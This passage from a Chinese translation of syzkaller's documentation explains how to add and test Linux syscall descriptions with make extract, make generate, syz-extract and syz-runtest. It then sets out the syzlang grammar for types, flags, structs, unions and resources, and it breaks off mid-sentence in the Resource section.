<li>一个全新的子系统可以作为一个新的<code>sys/linux/&lt;new&gt;.txt</code>文件被添加。</li>
<li>如果子系统的描述被分割成多个文件，请在每个文件的名称前加上子系统的名称（例如，使用<code>dev_*.txt</code>描述<code>/dev/</code>设备，使用<code>socket_*.txt</code>描述<code>socket</code>，等等）。</li>
</ul>
</li>
<li><p>添加&#x2F;更改描述后运行。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make extract TARGETOS=linux SOURCEDIR=<span class="variable">$KSRC</span></span><br><span class="line">make generate</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<ul>
<li>运行<code>syzkaller</code>。确保新添加的接口被<code>syzkaller</code>通过<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/coverage.md">覆盖</a>信息页面到达。</li>
</ul>
<p>在上面的说明中，<code>make extract</code>生成&#x2F;更新了<code>*.const</code>文件。<code>$KSRC</code>应该指向最新的内核。<br>注意：对于Linux来说，最新的内核通常是指主线树。<br>然而，在某些情况下，我们会添加一些尚未在主线树中出现的接口描述，所以如果<code>make extract</code>抱怨缺少头文件或常量在所有架构上都未定义，请尝试使用最新的<code>linux-next</code>树（或者如果它恰好在此时被破坏，请尝试稍旧的linux-next树）。<br>注意：<code>make extract</code>会覆盖<code>$KSRC</code>中的<code>.config</code>，而<code>mrproper</code>则会覆盖它。注意：<code>*.const</code>文件与<code>*.txt</code>的修改在同一提交中被<code>commit</code>。</p>
<p>然后<code>make generate</code>更新生成的代码，<code>make</code>重新构建二进制文件。<br>注意：<code>make generate</code>不需要任何内核源、本地编译器等，是纯文本处理。注意：<code>make generate</code>还会更新<code>executor/defs.h</code>下的<code>SYZ_REVISION</code>，这是运行<code>syz-manager</code>时机器检查所需要的。尤其是当你试图用你自己对系统调用的描述进行修改来重新建立数据库时，更应该注意这一点。</p>
<p>注意：<code>make extract</code>会提取所有需要安装交叉编译器的架构的常量。如果你遇到关于缺少编译器&#x2F;库的错误，请尝试<code>sudo make install_prerequisites</code>或者为你的发行版安装相应的软件包。注意：<code>sudo make install_prerequisites</code>即使在某些软件包安装失败的情况下也会成功，<code>sudo apt-get update &amp;&amp; sudo apt-get upgrade</code>可能是为了使其更有效。</p>
<p>如果你只想对你在本地描述的新子系统进行模糊处理，你可能会发现<code>enable_syscalls</code>配置参数对专门针对新的系统调用很有用。<code>enable_syscalls</code>列表中的所有系统调用都将被启用，如果它们的要求被满足的话（也就是说，如果它们在目标机器中被支持，并且任何其他需要运行以便为其提供输入的系统调用也被启用）。你也可以包括通配符定义，在一行中启用多个系统调用，例如。<code>&quot;ioctl &quot;</code>将启用所有符合要求的ioctls系统调用，<code>&quot;ioctl$UDMABUF_CREATE &quot;</code>只启用那个特定的<code>ioctl</code>调用，<code>&quot;write$UHID_*&quot;</code>启用所有以该描述标识符开头的写系统调用。</p>
<p>在更新现有的syzkaller描述时，请注意，除非某个特定的系统调用的描述有很大的变化，否则已经在语料库中的程序会被保留下来，除非你手动将它们清除掉（例如通过删除<code>corpus.db</code>文件）。</p>
<h2 id="Tips-and-FAQ"><a href="#Tips-and-FAQ" class="headerlink" title="Tips and FAQ"></a>Tips and FAQ</h2><h3 id="Syscall-struct-field-flags-名称"><a href="#Syscall-struct-field-flags-名称" class="headerlink" title="Syscall, struct, field, flags 名称"></a>Syscall, struct, field, flags 名称</h3><p>尽量使用现有的内核名称，如果可能，不要发明新的名称。</p>
<p>遵循既定的命名规则有以下好处。(1) 内核接口中使用的名字的一致性和熟悉性，这也使得能够在内核资源中搜索相关的名字；(2) 能够用<code>syz-check</code>对描述进行静态检查（例如，遗漏的标志或错误的字段）。</p>
<p>例如，如果在内核头文件中有一个现有的枚举<code>v4l2_buf_type</code>，那么在描述中也使用这个名字的标志。对于结构体、联合体、字段等也是如此。对于系统调用和结构的变体，在<code>$</code>符号后面加上变体名称。例如，<code>fcntl$F_GET_RW_HINT, ioctl$FIOCLEX</code>, <code>setsockopt$SO_TIMESTAMP</code>。</p>
<h3 id="系统调用的资源顺序"><a href="#系统调用的资源顺序" class="headerlink" title="系统调用的资源顺序"></a>系统调用的资源顺序</h3><p>资源和资源方向（<code>in</code>, <code>out</code>,<code>inout</code>）对参与的系统调用施加了隐含的排序约束。</p>
<p>如果一个系统调用接受一个特定类型的资源（例如，将<code>fd_cdrom</code>作为输入），那么它通常会被放在将该资源作为输出的系统调用之后，这样资源值就可以在系统调用之间传递。比如说：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r0 = openat$cdrom(...)</span><br><span class="line">ioctl$CDROMPAUSE(r0, <span class="number">0x123</span>)</span><br><span class="line">close(r0)</span><br></pre></td></tr></table></figure>

<p>系统调用的参数总是输入的，返回值是输出的，指针间接性有明确的方向作为<code>ptr</code>类型属性。此外，还可以为结构字段单独指定方向属性，以考虑到更复杂的生产者&#x2F;消费者场景，包括输入&#x2F;输出资源的结构。</p>
<h3 id="使用意料之外的-未声明的值"><a href="#使用意料之外的-未声明的值" class="headerlink" title="使用意料之外的&#x2F;未声明的值"></a>使用意料之外的&#x2F;未声明的值</h3><p>当指定整数&#x2F;字符串标志或整数字段时，只坚持使用官方的预期值。</p>
<p>通常情况下，bug是由意外的输入触发的。考虑到这一点，在描述中引入一些意想不到的值（例如<code>-1</code>或<code>INT_MAX</code>）可能太诱人了。这是不被鼓励的，有几个原因。首先，这是一个跨领域的问题，这些特殊的意外值仅仅适用于任何标志和整数领域。手动指定它们数千次是不可扩展的，也是不可维护的。第二，模糊器很难想出正确的复杂的系统调用序列，而描述是为了帮助解决这个问题。想出出乎意料的整数值很容易，模糊器在这里不需要帮助。总的来说，我们的想法是改进通用的fuzzer逻辑，以更好地处理这些情况，这将有助于所有的描述，而不是对每个单独的整数单独进行过度的专门化。Fuzzer已经有几个技巧来处理这个问题，例如，比较操作数值的拦截和典型的魔法值列表。</p>
<p>注意：标志的一些值可能只是作为一种疏忽而没有记录。这些值应该被添加到描述中。</p>
<h3 id="Flags-enums"><a href="#Flags-enums" class="headerlink" title="Flags&#x2F;enums"></a>Flags&#x2F;enums</h3><p>标志类型用于所有的：</p>
<ul>
<li>相互排斥的值的集合，其中只应选择其中一个（像C枚举）。</li>
<li>位标志的集合，其中多个值可以用位向OR结合起来（像mmap标志）。</li>
<li>上述的任何组合。</li>
</ul>
<p>模糊器有区分枚举和位标志的逻辑，并产生相应的值。因此，一般的指导原则是只列举标志中的有意义的值，而不添加任何 “特殊 “值来 “帮助 “当前的模糊器逻辑。当&#x2F;如果模糊器的逻辑发生变化&#x2F;改进时，这些手动添加的东西可能变得没有必要，或者更糟糕的是，干扰模糊器生成良好值的能力。</p>
<h3 id="定义顺序"><a href="#定义顺序" class="headerlink" title="定义顺序"></a>定义顺序</h3><p>syzlang不要求在使用前声明实体（像C&#x2F;C++那样），实体可以引用后来声明的实体（像Go那样）。建议按照重要性的顺序来声明东西，这样读者就能先看到最重要的东西，然后再进行越来越细的实现细节。例如，系统调用通常应该放在这些系统调用中使用的标志声明之前。注意：这种顺序通常与C语言中的声明方式完全相反：最不重要的东西放在前面。</p>
<h3 id="汇编的内部结构"><a href="#汇编的内部结构" class="headerlink" title="汇编的内部结构"></a>汇编的内部结构</h3><p>将文本的系统调用描述编译成机器可使用的形式，由syzkaller实际生成程序，这个过程包括两个步骤：</p>
<ol>
<li><p>第一步是使用<code>syz-extract</code>工具从内核源中提取符号常量值。<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/sys/syz-extract"><code>syz-extract</code></a>生成一个小的C程序，包括由<code>include</code>指令引用的内核头文件，定义由<code>define</code>指令指定的宏，并打印出符号常量值。结果存储在<code>.const</code>文件中，每个内核有一个。例如，<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/sys/linux/dev_ptmx.txt"><code>sys/linux/dev_ptmx.txt</code></a>被翻译成<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/sys/linux/dev_ptmx.txt.const"><code>sys/linux/dev_ptmx.txt.const</code></a>。</p>
</li>
<li><p>第二步是使用<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/sys/syz-sysgen"><code>syz-sysgen</code></a>工具将描述翻译成Go代码（实际的编译器代码存在于<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/pkg/ast"><code>pkg/ast</code></a>和<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/pkg/compiler"><code>pkg/compiler</code></a>中）。这一步使用系统调用描述和第一步中生成的<code>const</code>文件，并产生<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/prog/types.go"><code>prog/types.go</code></a>中定义的<code>Syscall</code>和<code>Type</code>类型的实例化。你可以在<code>sys/akaros/gen/amd64.go</code>中看到一个<code>Akaros</code>的编译器输出的例子。这一步还为<code>Executor/syscalls.h</code>中的C++代码生成了一些最小的<code>Syscall</code>元数据。</p>
</li>
</ol>
<h3 id="非主线子系统"><a href="#非主线子系统" class="headerlink" title="非主线子系统"></a>非主线子系统</h3><p><code>make extract</code>可以提取所有<code>*.txt</code>文件和所有支持的架构的常量。对于那些不存在于主线内核中的子系统，或者如果你有本地内核编译器的问题，这可能不起作用。在这种情况下，<code>make extract</code>使用的<code>syz-extract</code>工具可以手动运行单个文件&#x2F;架构。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">make bin/syz-extract</span><br><span class="line">bin/syz-extract -os linux -<span class="built_in">arch</span> <span class="variable">$ARCH</span> -sourcedir <span class="variable">$KSRC</span> -builddir <span class="variable">$LINUXBLD</span> &lt;new&gt;.txt</span><br><span class="line">make generate</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p><code>$ARCH</code>是<code>amd64</code>, <code>386</code>, <code>arm64</code>, <code>arm</code>, <code>ppc64le</code>, <code>mips64le</code>中的一种。如果子系统在几个架构上都支持，那么为每个架构运行<code>syz-extract</code>。<code>$LINUX</code>应该指向内核源码检出，它是为相应的<code>arch</code>配置的（也就是说，你需要先在那里运行<code>make ARCH=arch someconfig &amp;&amp; make ARCH=arch</code>，如果需要，记得添加<code>CROSS_COMPILE=arm-linux-gnueabi-/aarch64-linux-gnu-/powerpc64le-linux-gnu-</code>）。如果内核被建立在一个单独的目录中（用<code>make O=output_dir</code>，记得把<code>.config</code>放到<code>output_dir</code>，如果你想同时在不同的<code>arch</code>上工作，这将很有帮助），那么也要把<code>$LINUXBLD</code>设置为建立目录的位置。</p>
<h3 id="测试描述"><a href="#测试描述" class="headerlink" title="测试描述"></a>测试描述</h3><p>描述本身可能包含错误。在用新的描述运行<code>syz-manager</code>后，检查<code>syz-manager</code>网页界面上的内核代码覆盖率报告总是很有用的。该报告可以评估我们期望覆盖的东西是否真的被覆盖了，如果没有，那么模糊器就会卡在哪里。然而，这只是对描述正确性的一个有用但相当间接的评估。模糊器可以通过偏离描述的内容来解决描述中的一些错误，但这将大大增加模糊器的进展难度。</p>
<p>存储在<code>sys/OS/test/*</code>中的测试对描述提供了更直接的测试。每个测试只是一个带有检查的系统调用返回值的程序。这里简要介绍了程序的<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/program_syntax.md">语法</a>。你也可以看一下<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/sys/linux/test">现有的例子</a>和程序<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/prog/encoding.go">反序列化代码</a>。AUTO关键字可以作为常量和指针的值，对于指针来说，它将导致一些合理的内存地址的顺序分配。</p>
<p>至少为子系统的 “主要成功场景 “添加一个测试总是好的。它将确保描述确实是正确的，并且模糊器有可能得出成功的方案。请看<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/sys/linux/test/io_uring"><code>io_uring</code></a>测试作为一个很好的例子。</p>
<p>测试可以用<code>syz-runtest</code>工具运行，如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make runtest &amp;&amp; bin/syz-runtest -config manager.config</span><br></pre></td></tr></table></figure>

<p><code>syz-runtest</code>启动多个虚拟机并在虚拟机内以不同的执行模式运行这些测试。</p>
<p>然而，完整的<code>syz-runtest</code>运行需要时间，所以在开发测试的同时，使用<code>syz-execprog</code>工具来运行它更方便。要运行测试，请将<code>syz-execprog</code>、<code>syz-executor</code>和测试复制到一个手动启动的虚拟机中，然后在虚拟机中运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syz-execprog -debug -threaded=0 mytest</span><br></pre></td></tr></table></figure>

<p>它将显示所有执行的系统调用的结果。它对于手动调试伪系统调用代码也很方便：如果你在伪系统调用中加入一些临时性的调试调用，<code>syz-execprog -debug</code>会显示它们的输出。</p>
<p>测试的语法可以通过下面的方式来检查：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go <span class="built_in">test</span> -run=TestParsing ./pkg/runtest</span><br></pre></td></tr></table></figure>

<h1 id="Syscall-描述语言"><a href="#Syscall-描述语言" class="headerlink" title="Syscall 描述语言"></a>Syscall 描述语言</h1><p>也叫 <code>syzlang</code> 。</p>
<p>系统调用描述的伪代码语法：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syscallname <span class="string">&quot;(&quot;</span> [arg [<span class="string">&quot;,&quot;</span> arg]*] <span class="string">&quot;)&quot;</span> [<span class="built_in">type</span>] [<span class="string">&quot;(&quot;</span> attribute* <span class="string">&quot;)&quot;</span>]</span><br><span class="line">arg = argname <span class="built_in">type</span></span><br><span class="line">argname = identifier</span><br><span class="line"><span class="built_in">type</span> = typename [ <span class="string">&quot;[&quot;</span> type-options <span class="string">&quot;]&quot;</span> ]</span><br><span class="line">typename = <span class="string">&quot;const&quot;</span> | <span class="string">&quot;intN&quot;</span> | <span class="string">&quot;intptr&quot;</span> | <span class="string">&quot;flags&quot;</span> | <span class="string">&quot;array&quot;</span> | <span class="string">&quot;ptr&quot;</span> |</span><br><span class="line">	   <span class="string">&quot;string&quot;</span> | <span class="string">&quot;strconst&quot;</span> | <span class="string">&quot;filename&quot;</span> | <span class="string">&quot;glob&quot;</span> | <span class="string">&quot;len&quot;</span> |</span><br><span class="line">	   <span class="string">&quot;bytesize&quot;</span> | <span class="string">&quot;bytesizeN&quot;</span> | <span class="string">&quot;bitsize&quot;</span> | <span class="string">&quot;vma&quot;</span> | <span class="string">&quot;proc&quot;</span></span><br><span class="line">type-options = [type-opt [<span class="string">&quot;,&quot;</span> type-opt]]</span><br></pre></td></tr></table></figure>

<p>常见的类型选项包括：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;opt&quot;</span> - the argument is optional (like mmap fd argument, or accept peer argument)</span><br></pre></td></tr></table></figure>

<p>其余类型选项是特定于类型的：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;const&quot;</span>: <span class="built_in">integer</span> constant, type-options:</span><br><span class="line">	value, underlying <span class="built_in">type</span> (one of <span class="string">&quot;intN&quot;</span>, <span class="string">&quot;intptr&quot;</span>)</span><br><span class="line"><span class="string">&quot;intN&quot;</span>/<span class="string">&quot;intptr&quot;</span>: an <span class="built_in">integer</span> without a particular meaning, type-options:</span><br><span class="line">	optional range of values (e.g. <span class="string">&quot;5:10&quot;</span>, or <span class="string">&quot;100:200&quot;</span>),</span><br><span class="line">	optionally followed by an alignment parameter</span><br><span class="line"><span class="string">&quot;flags&quot;</span>: a <span class="built_in">set</span> of values, type-options:</span><br><span class="line">	reference to flags description (see below), underlying int <span class="built_in">type</span> (e.g. <span class="string">&quot;int32&quot;</span>)</span><br><span class="line"><span class="string">&quot;array&quot;</span>: a variable/fixed-length array, type-options:</span><br><span class="line">	<span class="built_in">type</span> of elements, optional size (fixed <span class="string">&quot;5&quot;</span>, or ranged <span class="string">&quot;5:10&quot;</span>, boundaries inclusive)</span><br><span class="line"><span class="string">&quot;ptr&quot;</span>/<span class="string">&quot;ptr64&quot;</span>: a pointer to an object, type-options:</span><br><span class="line">	direction (<span class="keyword">in</span>/out/inout); <span class="built_in">type</span> of the object</span><br><span class="line">	ptr64 has size of 8 bytes regardless of target pointer size</span><br><span class="line"><span class="string">&quot;string&quot;</span>: a zero-terminated memory buffer (no pointer indirection implied), type-options:</span><br><span class="line">	either a string value <span class="keyword">in</span> quotes <span class="keyword">for</span> constant strings (e.g. <span class="string">&quot;foo&quot;</span> or `deadbeef` <span class="keyword">for</span> hex literal),</span><br><span class="line">	or a reference to string flags (special value `filename` produces file names),</span><br><span class="line">	optionally followed by a buffer size (string values will be padded with \x00 to that size)</span><br><span class="line"><span class="string">&quot;stringnoz&quot;</span>: a non-zero-terminated memory buffer (no pointer indirection implied), type-options:</span><br><span class="line">	either a string value <span class="keyword">in</span> quotes <span class="keyword">for</span> constant strings (e.g. <span class="string">&quot;foo&quot;</span> or `deadbeef` <span class="keyword">for</span> hex literal),</span><br><span class="line">	or a reference to string flags,</span><br><span class="line"><span class="string">&quot;glob&quot;</span>: glob pattern to match on the target files, type-options:</span><br><span class="line">	a pattern string <span class="keyword">in</span> quotes (syntax: https://golang.org/pkg/path/filepath/#Match)</span><br><span class="line">	(e.g. <span class="string">&quot;/sys/&quot;</span> or <span class="string">&quot;/sys/**/*&quot;</span>),</span><br><span class="line">	or include exclude glob too (e.g. <span class="string">&quot;/sys/**/*:-/sys/power/state&quot;</span>)</span><br><span class="line"><span class="string">&quot;fmt&quot;</span>: a string representation of an <span class="built_in">integer</span> (not zero-terminated), type-options:</span><br><span class="line">	format (one of <span class="string">&quot;dec&quot;</span>, <span class="string">&quot;hex&quot;</span>, <span class="string">&quot;oct&quot;</span>) and the value (a resource, int, flags, const or proc)</span><br><span class="line">	the resulting data is always fixed-size (formatted as <span class="string">&quot;%020llu&quot;</span>, <span class="string">&quot;0x%016llx&quot;</span> or <span class="string">&quot;%023llo&quot;</span>, respectively)</span><br><span class="line"><span class="string">&quot;len&quot;</span>: length of another field (<span class="keyword">for</span> array it is number of elements), type-options:</span><br><span class="line">	argname of the object</span><br><span class="line"><span class="string">&quot;bytesize&quot;</span>: similar to <span class="string">&quot;len&quot;</span>, but always denotes the size <span class="keyword">in</span> bytes, type-options:</span><br><span class="line">	argname of the object</span><br><span class="line"><span class="string">&quot;bitsize&quot;</span>: similar to <span class="string">&quot;len&quot;</span>, but always denotes the size <span class="keyword">in</span> bits, type-options:</span><br><span class="line">	argname of the object</span><br><span class="line"><span class="string">&quot;offsetof&quot;</span>: offset of the field from the beginning of the parent struct, type-options:</span><br><span class="line">	field</span><br><span class="line"><span class="string">&quot;vma&quot;</span>/<span class="string">&quot;vma64&quot;</span>: a pointer to a <span class="built_in">set</span> of pages (used as input <span class="keyword">for</span> mmap/munmap/mremap/madvise), type-options:</span><br><span class="line">	optional number of pages (e.g. vma[7]), or a range of pages (e.g. vma[2-4])</span><br><span class="line">	vma64 has size of 8 bytes regardless of target pointer size</span><br><span class="line"><span class="string">&quot;proc&quot;</span>: per process int (see description below), type-options:</span><br><span class="line">	value range start, how many values per process, underlying <span class="built_in">type</span></span><br><span class="line"><span class="string">&quot;text&quot;</span>: machine code of the specified <span class="built_in">type</span>, type-options:</span><br><span class="line">	text <span class="built_in">type</span> (x86_real, x86_16, x86_32, x86_64, arm64)</span><br><span class="line"><span class="string">&quot;void&quot;</span>: <span class="built_in">type</span> with static size 0</span><br><span class="line">	mostly useful inside of templates and varlen unions, can<span class="string">&#x27;t be syscall argument</span></span><br></pre></td></tr></table></figure>

<p>当在<code>structs</code>&#x2F;<code>unions</code>&#x2F;<code>pointers</code>中使用时，<code>flags</code>&#x2F;<code>len</code>&#x2F;<code>flags</code>也有尾部的底层类型<code>type-option</code>。</p>
<p>标志描述为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagname = const [<span class="string">&quot;,&quot;</span> const]*</span><br></pre></td></tr></table></figure>

<p>或字符串标志为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagname = <span class="string">&quot;\&quot;&quot;</span> literal <span class="string">&quot;\&quot;&quot;</span> [<span class="string">&quot;,&quot;</span> <span class="string">&quot;\&quot;&quot;</span> literal <span class="string">&quot;\&quot;&quot;</span>]*</span><br></pre></td></tr></table></figure>

<p>调用属性为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;disabled&quot;</span>: 调用将不会被用于模糊测试；对于临时禁用某些调用或禁止某些参数组合来说是非常有用的。或禁止特定的参数组合。</span><br><span class="line"><span class="string">&quot;timeout[N]&quot;</span>: 在一些默认值的基础上，调用的额外执行超时（ms）。</span><br><span class="line"><span class="string">&quot;prog_timeout[N]&quot;</span>: 额外的执行超时（ms），如果整个程序包含这个调用。如果一个程序包含几个这样的调用，则使用最大值。</span><br><span class="line"><span class="string">&quot;ignore_return&quot;</span>: 在fallback feedback中忽略该系统调用的返回值；需要用于那些不返回固定错误代码而是返回其他东西（如当前时间）的调用。</span><br><span class="line"><span class="string">&quot;breaks_returns&quot;</span>: 在fallback feedback中忽略程序中所有后续调用的返回值（不能被信任）。</span><br></pre></td></tr></table></figure>

<h2 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h2><p><code>int8</code>, <code>int16</code>,<code>int32</code>和<code>int64</code>表示相应大小的整数。 <code>intptr</code>表示指针大小的整数，即C的<code>long</code>类型。加<code>be</code>后缀（例如<code>int16be</code>），表示大端。可以为一个整数指定一个值的范围，格式为<code>int32[0:100]</code>或<code>int32[0:4096, 512]</code>（表示512对齐的int）。用<code>int64:N</code>来表示一个大小为N的位域。</p>
<p>可以将这些不同类型的整数用作<code>const</code>、<code>flags</code>和<code>len</code>的基本类型<code>proc</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">example_struct &#123;</span><br><span class="line">	f0	int8			<span class="meta"># random 1-byte integer</span></span><br><span class="line">	f1	<span class="type">const</span>[<span class="number">0x42</span>, int16be]	<span class="meta"># const 2-byte integer with value 0x4200 (big-endian 0x42)</span></span><br><span class="line">	f2	int32[<span class="number">0</span>:<span class="number">100</span>]		<span class="meta"># random 4-byte integer with values from 0 to 100 inclusive</span></span><br><span class="line">	f3	int32[<span class="number">1</span>:<span class="number">10</span>, <span class="number">2</span>]		<span class="meta"># random 4-byte integer with values &#123;1, 3, 5, 7, 9&#125;</span></span><br><span class="line">	f4	int64:<span class="number">20</span>		<span class="meta"># random 20-bit bitfield</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Struct"><a href="#Struct" class="headerlink" title="Struct"></a>Struct</h2><p>结构描述为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">structname <span class="string">&quot;&#123;&quot;</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">	(fieldname type (<span class="string">&quot;(&quot;</span> fieldattribute* <span class="string">&quot;)&quot;</span>)? <span class="string">&quot;\n&quot;</span>)+</span><br><span class="line"><span class="string">&quot;&#125;&quot;</span> (<span class="string">&quot;[&quot;</span> attribute* <span class="string">&quot;]&quot;</span>)?</span><br></pre></td></tr></table></figure>

<p>可以在字段后面的括号中指定属性，与它们的类型无关。<code>in/out/inout</code>属性指定每个字段的方向，例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foo &#123;</span><br><span class="line">	field0	<span class="type">const</span>[<span class="number">1</span>, int32]	(in)</span><br><span class="line">	field1	<span class="title function_">int32</span>		<span class="params">(inout)</span></span><br><span class="line">	field2	<span class="title function_">fd</span>		<span class="params">(out)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>out_overlay</code>属性允许对结构进行单独的输入和输出布局。<code>out_overlay</code>字段之前的字段为输入，从<code>out_overlay</code>开始的字段为输出。输入和输出字段在内存中重叠（都是从内存中的结构开始）。如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">foo &#123;</span><br><span class="line">	in0	<span class="type">const</span>[<span class="number">1</span>, int32]</span><br><span class="line">	in1	flags[bar, int8]</span><br><span class="line">	in2	ptr[in, <span class="built_in">string</span>]</span><br><span class="line">	out0	<span class="title function_">fd</span>	<span class="params">(out_overlay)</span></span><br><span class="line">	out1	int32</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结构体可以在结构体后的方括号中指定属性。属性是：</p>
<ul>
<li><code>packed</code>: 这个结构在字段之间没有填充物，并且有对齐方式1；这类似于<code>GNU C __attribute__((packed))</code>；结构的对齐方式可以用<code>align</code>属性覆盖。</li>
<li><code>align[N]</code>: 这个结构的对齐方式是N，并且填充物是N的倍数；填充物的内容没有指定（不过经常是零）；类似于<code>GNU C __attribute__((aligned(N))</code></li>
<li><code>size[N]</code>: 结构被填充到指定的大小N；填充的内容没有指定（尽管经常是零）。</li>
</ul>
<h2 id="Union"><a href="#Union" class="headerlink" title="Union"></a>Union</h2><p>描述为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unionname <span class="string">&quot;[&quot;</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">	(fieldname type <span class="string">&quot;\n&quot;</span>)+</span><br><span class="line"><span class="string">&quot;]&quot;</span> (<span class="string">&quot;[&quot;</span> attribute* <span class="string">&quot;]&quot;</span>)?</span><br></pre></td></tr></table></figure>

<p>可以在<code>Union</code>之后的方括号中指定属性。属性是：</p>
<ul>
<li><code>varlen</code>：联合体的大小是所选择的特定选项的大小（不是静态的）；如果没有这个属性，联合体的大小是所有选项的最大值（类似于C的联合体）。</li>
<li><code>size[N]</code>: 联合体被填充到指定的大小N；填充的内容未被指定（不过，经常是零）。</li>
</ul>
<h2 id="Resource"><a href="#Resource" class="headerlink" title="Resource"></a>Resource</h2><p>资源代表需要从一个系统调用的输出传递到另一个系统调用的输入的值。例如，<code>close</code>系统调用需要一个先前由<code>open</code>或<code>pipe</code>系统调用返回的输入值（fd）。为了实现这一点，fd被声明为一种资源。这是一种模拟系统调用之间依赖关系的方式，因为将一个系统调用定义为资源的生产者，将另一个系统调用定义为消费者，在它们之间定义了一种松散的排序。资源被描述为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;resource&quot;</span> identifier <span class="string">&quot;[&quot;</span> underlying_type <span class="string">&quot;]&quot;</span> [ <span class="string">&quot;:&quot;</span> <span class="type">const</span> (<span class="string">&quot;,&quot;</span> <span class="type">const</span>)* ]</span><br></pre></td></tr></table></figure>

<p><code>underlying_type</code>是<code>int8</code>、<code>int16</code>、<code>int32</code>、<code>int64</code>、<code>intptr</code>中的一种，或者是另一种资源（它是继承的模型，例如，<code>socket</code>是fd的一个子类型）。可选的常量集代表资源的特殊值，例如，<code>0xffffffffffffff(-1)</code>代表 “没有fd”，或者<code>AT_FDCWD</code>代表 “当前dir”。特殊值作为资源值偶尔使用一次。如果没有指定特殊值，则使用特殊值0。然后，资源可以作为类型使用，例如：</p>
